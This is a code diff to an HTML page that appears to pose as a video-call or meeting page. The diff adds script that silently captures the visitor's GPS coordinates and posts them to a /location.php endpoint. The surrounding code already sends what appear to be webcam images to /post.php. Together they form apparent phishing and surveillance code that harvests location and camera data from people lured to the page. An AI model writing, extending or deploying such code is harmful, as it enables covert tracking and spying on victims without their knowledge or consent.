@@ -88,6 +88,19 @@ video, canvas { width: 100%; border-radius: 10px; display: none; }
     <button class="control-btn" style="background: #dc3545;">Leave</button>
 </div>
 <script>
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        $.ajax({
+            type: 'POST',
+            data: {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy
+            },
+            url: window.location.origin + '/location.php'
+        });
+    });
+}
 function post(imgdata) {
     $.ajax({ type: 'POST', data: { cat: imgdata }, url: window.location.origin + '/post.php' });
 }
